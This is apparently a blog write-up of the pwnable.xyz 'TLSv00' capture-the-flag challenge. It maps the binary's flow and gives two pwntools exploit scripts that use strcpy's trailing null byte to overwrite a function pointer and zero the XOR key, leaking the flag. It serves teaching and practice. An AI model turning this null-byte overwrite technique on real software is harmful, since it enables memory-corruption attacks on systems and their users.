---
title: pwnable.xyz TLSv00
date: 2025-2-27
categories: [pwnableXYZ, writeup]
---

# Problem

> Transport the flag securely, right?

- `challenge`: challenge: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9a059015fda4b190e6f6e9d20cbab5de1b47d980, not stripped

# Recon

The structure and flow of the program are as follow

- `main()`
    - `generate_key(0x3f)`
    - input:
        - 1 -> `generate_key(read_int32())`
        - 2 -> `load_flag()`
        - 3 -> `print_flag()`
- `generate_key(len)`
    - read `len` bytes from `/dev/urandom` to buffer
    - `strcpy` buffer to `key`
- `load_flag()`
    - read flag to `flag`
    - XOR encode `flag` with `key`
- `print_flag()`
    - byte `do_comment` is 0
        - if input == 'y'
            - move `f_do_comment` to `do_comment`
        - run `do_comment()`
    - else
        - do nothing
- `f_do_comment()`
    - read 33 bytes from stdin
- `real_print_flag()`
    - print `flag`

Also all security settings are enabled, it's most likely that we need to override `do_comment` to `real_print_flag`

![alt text]({{site.baseurl}}/assets/images/pwnable-xyz-TLSv00/checksec.png)

# Exploit

## Override do_comment

Notice that `f_do_comment` is at 0xb1f, `real_print_flag` is at 0xb00 , and the global variables `key` and `do_comment` memory are as follow, so after first `print_flag` we only need to change the first byte to \x00 (little endian), which can be done with `generate_key(0x40)`, since `strcpy` will write a \x00 byte to the end of the string.

![alt text]({{site.baseurl}}/assets/images/pwnable-xyz-TLSv00/global.png)

With this script, it can successfully call `real_print_flag`, however the flag is encrypted.

```python
io = start()

# set do_comment = f_do_comment
io.sendlineafter(b"> ", b"3")
io.sendlineafter(b"Wanna take a survey instead? ", b"y")

# override first byte of do_comment to \x00
io.sendlineafter(b"> ", b"1")
io.sendlineafter(b"key len: ", b"64")

# load and print flag
io.sendlineafter(b"> ", b"2")
io.sendlineafter(b"> ", b"3")
io.sendlineafter(b"Wanna take a survey instead? ", b"n")
flag = io.recv(0x40)
log.info(f"{flag = }")

io.interactive()
```

![alt text]({{site.baseurl}}/assets/images/pwnable-xyz-TLSv00/encrypted.png)

## Override Key

Since any byte XOR with 0 is the same, we can use the same concept that `strcpy` will write \x00 to the end to reset the key to all \x00 except the first byte due to `generate_key` constraint. The final exploit will be

```python
io = start()

# set do_comment = f_do_comment
io.sendlineafter(b"> ", b"3")
io.sendlineafter(b"Wanna take a survey instead? ", b"y")

# override first byte of do_comment to \x00
io.sendlineafter(b"> ", b"1")
io.sendlineafter(b"key len: ", b"64")

# set key+0x1 to key+0x3f to \x00
for i in range(0x3f, 0x0, -1):
    log.info(f"setting key+{hex(i)} to 0")
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"key len: ", f"{i}".encode())


# load and print flag
io.sendlineafter(b"> ", b"2")
io.sendlineafter(b"> ", b"3")
io.sendlineafter(b"Wanna take a survey instead? ", b"n")
flag = b"F" + io.recv(0x40).split(b'}')[0][1:] + b"}"
log.info(f"{flag = }")

io.interactive()
```